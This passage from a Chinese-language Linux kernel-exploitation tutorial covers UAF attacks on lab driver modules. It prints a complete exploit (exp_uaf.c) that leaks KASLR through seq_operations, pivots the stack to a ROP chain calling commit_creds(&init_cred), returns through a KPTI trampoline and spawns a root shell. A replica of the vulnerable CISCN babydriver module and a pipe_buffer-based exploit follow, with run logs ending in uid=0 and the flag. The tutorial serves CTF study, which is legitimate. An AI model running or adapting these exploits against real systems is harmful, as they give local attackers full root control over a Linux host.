cs/rflags/rsp/ss 四个值的保存与对齐沿用 [[P18-KernelPWN入门#5.2 ret2usr：让内核执行用户态的函数|P18 5.2]] 的 `save_state` 与 `(user_sp & ~0xf) - 8`，不重述。整条链摆好后的用户态内存：

```asm
; ROP 链（mmap 在 pivot gadget 低 32 位所在页，x86-64 用户态）
[pivot_lo + 0x00]  pop_rdi_ret        ; xchg 的 ret 落进这里
[pivot_lo + 0x08]  &init_cred
[pivot_lo + 0x10]  commit_creds       ; 凭据已是 root
[pivot_lo + 0x18]  kbase + 0x11dc     ; KPTI 收尾入口（mov rdi,rsp）
[pivot_lo + 0x20]  0                  ; 用户态 rdi
[pivot_lo + 0x28]  0                  ; 占位（收尾路径不读）
[pivot_lo + 0x30]  win_land           ; --- 以下为 iret 帧 ---
[pivot_lo + 0x38]  user_cs
[pivot_lo + 0x40]  user_rflags
[pivot_lo + 0x48]  (user_sp & ~0xf) - 8
[pivot_lo + 0x50]  user_ss
```

### 5.3 exploit 全文

```c
/* exp_uaf.c —— UAF 完整利用：泄露 KASLR + 劫持 seq_operations +
 *               栈迁移到用户态 ROP + KPTI 收尾（x86-64 Linux，内核 7.0）
 * 运行前提（本章环境）：qemu64（SMEP/SMAP 关），cmdline 带 pti=on，
 * KASLR 开启，/dev/uafdev 已加载。 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/ioctl.h>

#define UAF_ALLOC 0x5001
#define UAF_FREE  0x5002
#define UAF_READ  0x5003
#define UAF_WRITE 0x5004

struct uaf_req {
	void *buf;
	unsigned long len;
};

/* 相对内核基址的偏移：符号来自 System.map，gadget 偏移来自 vmlinux 反汇编 */
#define OFF_SINGLE_START 0x0929cd0
#define OFF_POP_RDI_RET  0x02a7b9d   /* pop rdi ; ret */
#define OFF_INIT_CRED    0x02a15b80
#define OFF_COMMIT_CREDS 0x048a7e0
#define OFF_TRAMPOLINE   0x00011dc   /* swapgs_restore_...+0x6c: mov rdi,rsp */
#define OFF_XCHG_ESP_EAX 0x020f1a8   /* xchg esp,eax ; ret */

#define SPRAY 256

static unsigned long user_cs, user_ss, user_rflags, user_sp;

static void save_state(void)
{
	__asm__ __volatile__(
		"movq %%cs,  %0\n\t"
		"movq %%ss,  %1\n\t"
		"pushfq\n\t"
		"popq  %2\n\t"
		"movq %%rsp, %3\n\t"
		: "=r"(user_cs), "=r"(user_ss), "=r"(user_rflags), "=r"(user_sp)
		:
		: "memory");
}

/* iretq 的落点：此刻凭据已是 root，换壳成 shell */
static void win_land(void)
{
	char *argv[] = { "/bin/sh", NULL };

	printf("[+] back in userland: uid=%d gid=%d\n", getuid(), getgid());
	execve("/bin/sh", argv, NULL);
	perror("[-] execve");
	exit(1);
}

static int fd_dev;
static int spray_fds[SPRAY];
static int n_spray;

static unsigned long leak_base(unsigned long *quads)
{
	struct uaf_req rq;
	unsigned long base;
	int i;

	ioctl(fd_dev, UAF_ALLOC, 32);
	ioctl(fd_dev, UAF_FREE);

	/* 堆喷占位；spray 之前不打印，避免中间产生多余的内核分配 */
	for (i = 0; i < SPRAY; i++) {
		spray_fds[i] = open("/proc/self/stat", O_RDONLY);
		if (spray_fds[i] < 0)
			break;
	}
	n_spray = i;

	rq.buf = quads;
	rq.len = 32;
	ioctl(fd_dev, UAF_READ, &rq);
	base = quads[0] - OFF_SINGLE_START;
	printf("[*] leaked seq_operations: start=0x%lx stop=0x%lx\n",
	       quads[0], quads[1]);
	printf("[*] kernel base = 0x%lx (sprayed %d fds)\n", base, n_spray);
	return base;
}

int main(void)
{
	struct uaf_req rq;
	unsigned long quads[4];
	unsigned long base, pop_rdi, init_cred, commit_creds, tramp, xchg;
	unsigned long pivot_lo, pivot_page, *chain;
	char rbuf[64];
	int i;

	setvbuf(stdout, NULL, _IONBF, 0);
	save_state();

	fd_dev = open("/dev/uafdev", O_RDONLY);

	base         = leak_base(quads);
	pop_rdi      = base + OFF_POP_RDI_RET;
	init_cred    = base + OFF_INIT_CRED;
	commit_creds = base + OFF_COMMIT_CREDS;
	tramp        = base + OFF_TRAMPOLINE;
	xchg         = base + OFF_XCHG_ESP_EAX;

	/* 迁移落点：gadget 地址的低 32 位是一颗确定的虚拟地址，
	 * 把所在页提前 mmap 好，链就摆在 rsp 落下的位置 */
	pivot_lo   = xchg & 0xffffffffUL;
	pivot_page = pivot_lo & ~0xfffUL;
	chain = mmap((void *)pivot_page, 0x2000, PROT_READ | PROT_WRITE,
		     MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	chain = (unsigned long *)pivot_lo;
	chain[0] = pop_rdi;                 /* ret 落进这里：pop rdi */
	chain[1] = init_cred;               /* rdi = &init_cred */
	chain[2] = commit_creds;            /* commit_creds(&init_cred) */
	chain[3] = tramp;                   /* KPTI 收尾：mov rdi,rsp 处切入 */
	chain[4] = 0;                       /* 回到用户态后的 rdi（任意值） */
	chain[5] = 0;                       /* 收尾路径跳过 +0x08 不读 */
	chain[6] = (unsigned long)win_land; /* iret 帧：rip */
	chain[7] = user_cs;                 /*            cs */
	chain[8] = user_rflags;             /*            rflags */
	chain[9] = (user_sp & ~0xfUL) - 8;  /*            rsp（对齐到入口约定） */
	chain[10] = user_ss;                /*            ss */
	printf("[*] pivot gadget 0x%lx -> rsp = 0x%lx (page mmap'ed)\n",
	       xchg, pivot_lo);

	/* 悬垂写：把占回格子的 seq_operations->start 覆盖成迁移 gadget */
	quads[0] = xchg;
	quads[1] = 0;  quads[2] = 0;  quads[3] = 0;
	rq.buf = quads;
	rq.len = 32;
	ioctl(fd_dev, UAF_WRITE, &rq);
	printf("[*] seq_operations->start overwritten, triggering reads\n");

	/* 逐个读喷出来的 fd：干净的返回统计文本，占回格子的那个触发劫持 */
	for (i = 0; i < n_spray; i++)
		if (read(spray_fds[i], rbuf, sizeof(rbuf)) < 0)
			break;

	printf("[-] no hijack?\n");
	return 0;
}
```

两个细节：悬垂写只改第一个四字（start），后三个槽清零也无妨——劫持发生在 start 被调用的第一刻，`stop/next/show` 不会被碰到；触发阶段逐个 `read` 喷出来的 256 个 fd，干净的 fd 正常返回统计文本，占回格子的那个一进 `seq_read_iter` 就把控制流交出去。

### 5.4 完整运行

```
### demo: uaf ###
uid=1000(ctf) gid=1000(ctf)
cat: can't open '/flag.txt': Permission denied
[    2.465829] uafdev: alloc size=32 buf=0xffff8c33813ae220
[    2.466125] uafdev: free buf=0xffff8c33813ae220 (pointer kept)
[*] leaked seq_operations: start=0xffffffff8c729cd0 stop=0xffffffff8c729d30
[*] kernel base = 0xffffffff8be00000 (sprayed 256 fds)
[*] pivot gadget 0xffffffff8c00f1a8 -> rsp = 0x8c00f1a8 (page mmap'ed)
[*] seq_operations->start overwritten, triggering reads
[+] back in userland: uid=0 gid=0


BusyBox v1.37.0 (Ubuntu 1:1.37.0-7ubuntu1) built-in shell (ash)
Enter 'help' for a list of built-in commands.

/home/ctf # id
uid=0(root) gid=0(root)
/home/ctf # cat /flag.txt
flag{p19_uaf_kernel_takeover}
/home/ctf # exit
[   18.922482] ACPI: PM: Preparing to enter system sleep state S5
[   18.922834] reboot: Power down
```

从 `Permission denied` 到 root shell，链条的每一段都对应一次悬垂访问：泄露来自悬垂读，劫持来自悬垂写，基址 `0xffffffff8be00000` 与第 4 节的 `0xffffffff98a00000` 不同——KASLR 每次启动独立。收尾的干净程度值得一提：==提权与返回都发生在内核自己的代码路径里==，`commit_creds` 正常返回进收尾，收尾按正规 irret 帧落回 `win_land`，内核没有任何异常记录。

> [!info]- 为什么不直接用 ret2usr
> SMEP 关闭时（qemu64），把 start 槽改成用户态函数地址、函数体里执行 `commit_creds(prepare_kernel_cred(&init_task))` 再正常 `ret` 回 `seq_read_iter` 也能提权，而且连 ROP 都不用拼——这正是 [[P18-KernelPWN入门#5.2 ret2usr：让内核执行用户态的函数|P18 5.2]] 的 ret2usr 换了个触发点。本章仍走迁移 + ROP：一方面函数指针劫持后要求"干净地回到内核继续执行"，返回路径比栈溢出场景更挑剔；另一方面 ROP + 内核返回路径的组合不依赖"内核能执行用户页"，把 SMEP 从前提里拿掉了（SMAP 见 5.5）。真题环境两者通常都开，ROP 是必经路。

> [!warning] SMAP 开启时这条链死在哪
> 链的本体（迁移 gadget、`pop rdi`、`commit_creds`）全在内核文本里执行，SMEP 管不着；但链和伪造数据都摆在用户页上，SMAP 一开，内核态第一次 `ret` 读用户栈就触发 `#PF ... permissions violation`。SMAP 开启环境的对应打法是把"链"搬进内核可写内存：堆喷更受控的对象（如 `msg_msg`、`pipe_buffer`）当链容器，或借用内核栈残渣（residual stack data）做跳板——思路在 [[P18-KernelPWN入门#7. KASLR / SMEP / SMAP / KPTI：内核侧的缓解清单|P18 第 7 节]]的对照表里，本题环境不展开。

## 6. 竞态与窗口：userfaultfd 与 FUSE 的位置

第 3–5 节的 UAF 不需要竞态：ioctl 序列天然同步，free 与占位之间的窗口想多长有多长。内核堆题还有另一族漏洞，窗口由自己"停"出来：

- ==double-fetch==：漏洞路径对同一份用户数据访问两次（先检查后使用），两次之间用户线程把它改掉。停窗口的手段是让第一次与第二次访问之间发生一次可控的缺页——`userfaultfd` 注册的缺页处理线程会把访问者睡到用户态处理完为止，窗口从纳秒级变成任意长；
- ==分配/释放竞态==：两个线程分别驱动 free 与 reuse 的时序，同样可以用缺页停住一端，把交错的概率提到确定。

适用条件两条：内核配置允许（`CONFIG_USERFAULTFD`，普通用户能否注册受 `vm.unprivileged_userfaultfd` 控制）；漏洞路径确实两次触达用户页（或两条 syscall 路径能被精确交错）。`FUSE` 挂载是 userfaultfd 的替代品：把"文件内容页"交给用户态文件系统，内核读它时必然陷进用户态——真题容器禁 FUSE 的不少，两个都要按题目环境核对。本章环境两项配置都在（`CONFIG_USERFAULTFD=y`），但没有可直接演示的漏洞形态，到此为止；做题时先问一句"窗口在哪、能不能停"，再决定要不要碰这一族。

## 7. babydriver 完整复盘

[[P18-KernelPWN入门#11. 配套练习与延伸阅读|P18 配套练习]]留下的经典题：CISCN 2017 babydriver。本节先复刻它的驱动模型，再把当年的解法与本内核上的现代化打法对照走通。

### 7.1 驱动模型：两次 open 共享一块内存

原题驱动（4.x 内核）的逻辑四处，`babydev.c` 原样保留（x86-64 Linux）：

```c
/* babydev.c —— CISCN 2017 babydriver 的驱动模型复刻
 * 注册成 misc 字符设备 /dev/babydev，权限 0666。 */
#define BABY_IOCTL_REALLOC 0x10001

static struct {
	char *buf;
	size_t len;
} babydev;

static int babyopen(struct inode *inode, struct file *filp)
{
	/* GFP_KERNEL_ACCOUNT：与 pipe_buffer 等占位对象同走 kmalloc-cg-* 家族 */
	babydev.buf = kmalloc(babydev.len, GFP_KERNEL_ACCOUNT);
	if (!babydev.buf)
		return -ENOMEM;
	pr_info("babydev: open, buf=0x%px len=%zu\n", babydev.buf, babydev.len);
	return 0;
}

static int babyrelease(struct inode *inode, struct file *filp)
{
	kfree(babydev.buf);
	/* 漏洞：不清 babydev.buf，其他 fd 与后续操作仍指向这块已释放内存 */
	pr_info("babydev: release, buf=0x%px freed (pointer kept)\n", babydev.buf);
	return 0;
}

static ssize_t babyread(struct file *filp, char __user *buf,
			size_t size, loff_t *ppos)
{
	if (size > babydev.len)
		return -EINVAL;
	if (copy_to_user(buf, babydev.buf, size))
		return -EFAULT;
	return size;
}

static ssize_t babywrite(struct file *filp, const char __user *buf,
			 size_t size, loff_t *ppos)
{
	if (size > babydev.len)
		return -EINVAL;
	if (copy_from_user(babydev.buf, buf, size))
		return -EFAULT;
	return size;
}

static long babyioctl(struct file *filp, unsigned int cmd, unsigned long arg)
{
	if (cmd == BABY_IOCTL_REALLOC) {
		kfree(babydev.buf);
		babydev.buf = kmalloc(arg, GFP_KERNEL_ACCOUNT);
		if (!babydev.buf)
			return -ENOMEM;
		babydev.len = arg;
		return 0;
	}
	return -ENOTTY;
}
```

漏洞结构与 `uafdev` 同型，但悬垂的成因不同：==缓冲区指针在全局结构里，不属于任何一个 fd==。打开两次，第二次 `open` 重新 `kmalloc` 并覆盖全局指针——第一个 fd 的缓冲区被泄漏，两个 fd 从此共享同一个缓冲区；`ioctl(0x10001)` 换一块指定大小的新缓冲；`close` 任意一个 fd 都会 `kfree` 这块共享缓冲而不清指针——==另一个 fd 从此悬垂==。

当年（原题附件 4.4 内核）的解法一句话：启动参数把 KASLR、SMEP、SMAP 全关，open 两次后 `ioctl` 把缓冲区重分配到 `sizeof(tty_struct)` 的尺寸类，close 其一，`open("/dev/ptmx")` 堆喷 `tty_struct` 占位，经悬垂 fd 读写覆盖 `tty->ops` 指向用户态伪造表，`ioctl` 触发 `ops->ioctl` 直接 ret2usr 执行 `commit_creds(prepare_kernel_cred(0))`——没有 KASLR 就不用泄露，没有 SMEP 就不用 ROP。这套打法在本内核上的两处对应物已经分别就位：函数表伪造（本章第 5 节用的是 seq_operations，同一思想）与提权调用（P18 5.1 的版本注记）。

### 7.2 占位对象换血：tty_struct 为什么等不回来

在本内核上照搬"喷 tty_struct"会扑空，原因就是 1.1 的缓存家族表：`tty_struct` 由 `tty_open` 里的普通 `GFP_KERNEL` 分配，落在按调用点散列的 `kmalloc-rnd-*` 桶里；`babydev` 模块自己的 `kmalloc` 是另一个调用点，散列进哪个桶与 `tty_open` 无关——同桶概率 1/16，且随每次启动的 seed 变化。==悬垂块在哪个桶，占位对象就必须在哪个桶==，而调用点散列不可控。

解法是换占位对象，要求不变：同家族同尺寸、内容含函数表指针、有稳定的触发路径。`pipe_buffer` 三条全占：

- 管道创建时 `kcalloc(16, sizeof(struct pipe_buffer), GFP_KERNEL_ACCOUNT)` 分配缓冲数组——==ACCOUNT 分配，16 × 40 = 640 字节，落 `kmalloc-cg-1k`==，与 babydev 重分配到 1024 的悬垂块同家族同尺寸；
- `struct pipe_buffer` 每 40 字节一条：`page`、`offset/len` 一对 u32、==`ops` 函数表指针==、`flags`、`private`——第 3 个四字（+0x10）就是泄露点；
- 触发路径是 `close`：管道销毁时对每个带 `ops` 的 buffer 调 `ops->release(pipe, buf)`。

`ops` 指向的 `anon_pipe_buf_ops` 的表内容从 vmlinux 里对出来：

```python
# 对 anon_pipe_buf_ops（0xffffffff82853100）的表内容逐四字查 System.map
```

输出：

```
+0x00  0x0000000000000000  ?
+0x08  0xffffffff818f5510  anon_pipe_buf_release
+0x10  0xffffffff818f57c0  anon_pipe_buf_try_steal
+0x18  0xffffffff818f47b0  generic_pipe_buf_get
```

`release` 槽在 +0x08——伪造表只需要这一格有值。整体打法：悬垂 fd 读回占位的 `pipe_buffer` 数组，+0x10 的 `&anon_pipe_buf_ops` 反推内核基址（顺便就是 KASLR 泄露）；悬垂写把 `bufs[1].ops`（数组第二格，+0x28 起）改成用户态伪造表，`release` 槽放第 5 节同一个迁移 gadget；close 全部管道，占回格子的那支在 `bufs[1]` 上触发 `ops->release`——经 retpoline 跳板进入 gadget 时 `rax` = 槽位值，`xchg esp,eax` 迁移，后面的 ROP 与 5.2 完全相同。伪造函数表触发内核函数指针的打法，与用户态的 FSOP（[[P16-FSOP与HouseofApple2|P16]] 伪造 FILE 的 vtable）是同一个思想的两个舞台。

### 7.3 exploit 与完整运行

`baby_exp.c` 主体（泄露、伪造表、迁移与 ROP 的构造与 `exp_uaf.c` 逐段相同，只列差异处）：

```c
/* baby_exp.c —— babydriver 复刻盘（x86-64 Linux，内核 7.0）
 * 偏移：anon_pipe_buf_ops 来自 System.map，其余同 exp_uaf.c。 */
#define OFF_ANON_PIPE_BUF_OPS 0x1853100
#define PBUF_RELEASE_SLOT 1        /* pipe_buf_operations 的 release 槽 +0x08 */
#define SPRAY 64
#define DUMP_LEN 0x40

	fd1 = open("/dev/babydev", O_RDWR);
	fd2 = open("/dev/babydev", O_RDWR);   /* 两次 open：共享全局缓冲区 */
	ioctl(fd1, BABY_IOCTL_REALLOC, 1024); /* 重分配到 kmalloc-cg-1k */
	close(fd1);                           /* kfree，fd2 悬垂 */

	/* 堆喷：管道 + 每支写 1 字节（bufs[0].ops 只有缓冲区有数据时才填表） */
	for (i = 0; i < SPRAY; i++) {
		if (pipe(pfd[i]) < 0)
			break;
		write(pfd[i][1], "A", 1);
	}
	n_pipe = i;

	read(fd2, dump, sizeof(dump));        /* 悬垂读：pipe_buffer 数组现场 */
	/* dump[0] = page 指针；dump[1] = 0x0000000100000000（offset=0, len=1）；
	 * dump[2] = &anon_pipe_buf_ops 的运行期地址 -> 内核基址 */
	base = dump[2] - OFF_ANON_PIPE_BUF_OPS;

	memset(fake_ops, 0, sizeof(fake_ops));
	fake_ops[PBUF_RELEASE_SLOT] = xchg;   /* release 槽 -> xchg esp,eax ; ret */

	/* 悬垂写：bufs[0]（+0x00..+0x27）按读回原样保留，close 时照常释放；
	 * bufs[1]（+0x28 起）整格填 0，只把 ops 指向伪造表 */
	memset(dump + 5, 0, 3 * 8);
	dump[7] = (unsigned long)fake_ops;
	write(fd2, dump, DUMP_LEN);

	/* close 全部管道：free_pipe_info 逐个调 ops->release，
	 * 占回格子的那支管道在 bufs[1] 上触发劫持 */
	for (i = 0; i < n_pipe; i++) {
		close(pfd[i][0]);
		close(pfd[i][1]);
	}
```

完整运行（ROP 链与 5.3 同一套，迁移动作在 close 路径里完成）：

```
### demo: baby ###
uid=1000(ctf) gid=1000(ctf)
cat: can't open '/flag.txt': Permission denied
[    2.463086] babydev: open, buf=0xffff8d6b81ea3040 len=64
[    2.463927] babydev: open, buf=0xffff8d6b81ea3700 len=64
[*] babydev opened twice: fd1=3 fd2=4 (shared global buffer)
[    2.465433] babydev: realloc buf=0xffff8d6b813dd000 len=1024
[    2.465724] babydev: release, buf=0xffff8d6b813dd000 freed (pointer kept)
[*] realloc to 1024, fd1 closed — fd2 now dangling
[*] sprayed 64 pipes (pipe_buffer, kmalloc-cg-1k)
[*] dangling read: +0x00=0xfffff286400b5500 +0x08=0x0000000100000000 +0x10=0xffffffffb9853100
[+] pipe_buffer reclaimed: ops = &anon_pipe_buf_ops @ 0xffffffffb9853100
[+] kernel base = 0xffffffffb8000000
[*] bufs[1].ops -> fake table (release slot = xchg gadget 0xffffffffb820f1a8)
[+] back in userland: uid=0 gid=0


BusyBox v1.37.0 (Ubuntu 1:1.37.0-7ubuntu1) built-in shell (ash)
Enter 'help' for a list of built-in commands.

/home/ctf # id
uid=0(root) gid=0(root)
/home/ctf # cat /flag.txt
flag{p19_uaf_kernel_takeover}
/home/ctf # exit
[   18.897108] babydev: release, buf=0xffff8d6b813dd000 freed (pointer kept)
[   18.909330] ACPI: PM: Preparing to enter system sleep state S5
[   18.910452] reboot: Power down
```

对照读一遍，每一行都对应 7.2 的一个判断：

- 悬垂读三行是 `pipe_buffer` 的现场：`+0x08 = 0x0000000100000000` 正是 `offset=0, len=1` 两个 u32（那 1 字节的 "A"），`+0x10` 是 `&anon_pipe_buf_ops` 的运行期地址——==占位成功与泄露同时完成==；
- 基址 `0xffffffffb8000000` 仍是 2MB 对齐，减 `anon_pipe_buf_ops` 的 System.map 偏移 `0x1853100` 精确吻合；
- 触发点在 close 而不是 read：`[+] back in userland` 出现在模块日志之间，`free_pipe_info` 的释放循环走到了 `bufs[1]` 的伪造表。

至此 babydriver 的模型、当年的思路与现代化改造全部落完。两道题（第 5 节与第 7 节）共享同一条 ROP 尾巴，差异只在"悬垂块占回用什么对象、函数指针从哪里触发"——这正是内核 UAF 题的通用骨架：==漏洞给一块可读写的悬垂内存，占位对象决定泄露与劫持的形状，触发路径决定 EXP 的触发点==。

## 8. 常见问题

| 现象 | 原因与解决 |
| ---- | ---- |
| insmod 报 `Invalid module format` | 模块与内核版本不同源（[[P18-KernelPWN入门#4. 内核模块与漏洞模块\|P18 4.1]]）：headers 与 bzImage 必须同版本 |
| 喷了几百个对象，悬垂读回仍是自己的模式串 | 占位对象与悬垂块不同缓存：查两边分配标志是否同为 `__GFP_ACCOUNT`（1.1 的表），普通 `GFP_KERNEL` 分配还要考虑 `kmalloc-rnd` 桶 |
| 悬垂读到的四字是 0 或堆地址 | 占位没占上或占了别的对象：ALLOC 后立刻喷，喷完核对四字是否全为内核文本地址（第 4 节的形状） |
| xchg 之后 panic 在怪地址 | 迁移落点页没 mmap，或链没摆在 gadget 低 32 位地址处（5.2）：`pivot_lo = gadget & 0xffffffff`，页对齐后整页映射 |
| `commit_creds` 执行完没能回用户态 | KPTI 开启时必须走内核返回路径收尾（5.2）：入口偏移按本内核反汇编现场量（[[P18-KernelPWN入门#6.3 链的收尾：回到用户态\|P18 6.3]]） |
| 提权进了 shell 但 `id` 还是 1000 | 提权参数没装对：6.2+ 内核 `prepare_kernel_cred(0)` 返回 NULL（[[P18-KernelPWN入门#5.1 cred：内核里的"我是谁"\|P18 5.1]]），用 `commit_creds(&init_cred)` 最短 |
| babydev 悬垂 fd `write` 报 EBADF | fd 用 `O_RDONLY` 打开的：设备按 `O_RDWR` 打开（7.3） |
| 管道喷完 `+0x08` 不是 `0x0000000100000000` | 漏了"每支管道写 1 字节"：`bufs[0].ops` 只在缓冲区有数据时才填表（7.3） |
| `/proc/kallsyms` 读出来全是 0 | `kptr_restrict`/`perf_event_paranoid` 默认对普通用户隐藏地址（[[P18-KernelPWN入门#5.5 /proc/kallsyms：符号对账\|P18 5.5]] 折叠框）：按附件 System.map 写死，或 root 读一次 |
| 迁移 gadget 搜不到想要的形状 | 字节模式搜索只覆盖 `; ret` 结尾的短形状：放宽到跨指令重叠落点，或换 `ROPgadget`/`ropper` 全量扫（[[P18-KernelPWN入门#6.2 在 vmlinux 上搜 gadget\|P18 6.2]]） |

## 9. 配套练习与延伸阅读

> [!note] 实战任务
> 1. 把本章环境完整复现一遍（P18 第 2、3 节的环境 + 本章两个模块），依次走通第 4、5 节，确认泄露与 getshell；
> 2. 把 5.3 的提权链换成 `commit_creds(prepare_kernel_cred(&init_task))`：需要一条把 rax 搬进 rdi 的 gadget，先按 [[P18-KernelPWN入门#6.2 在 vmlinux 上搜 gadget|P18 6.2]] 的方法在本内核搜一轮，体会"裸 ret 结尾的搬运片段稀少"这条警告；
> 3. 拿 CISCN 2017 babydriver 的原题附件（4.4 内核）用当年的打法完整做一遍——tty_struct 占位 + ret2usr，与本章 7.2 的现代化打法逐段对照，列出每一步的"当年/现在"差异及对应缓解机制；
> 4. 找一道 userfaultfd/FUSE 型的内核题（各平台 kernel 分类下标注 race/double-fetch 的），对照第 6 节的适用条件清单判断窗口能不能停，再动手。

延伸阅读按需取用：内核源码 `Documentation/mm/slub.rst`（SLUB 的权威描述）与 `mm/slab_common.c`（缓存创建与合并的判据代码）；LWN 上关于 SLUB 与 kmalloc 缓存随机化（`CONFIG_RANDOM_KMALLOC_CACHES`）的系列文章，1.1 的桶机制在补丁集说明里有更完整的动机描述；`scripts/extract-vmlinux` 与 System.map 的用法 [[P18-KernelPWN入门#2. 环境搭建（一）：内核镜像与未压缩 vmlinux|P18 第 2 节]]已备齐。工具侧，`vmlinux-to-elf` 能从无符号 bzImage 恢复带符号的 vmlinux，做真题时先备一份带符号的镜像再搜 gadget。
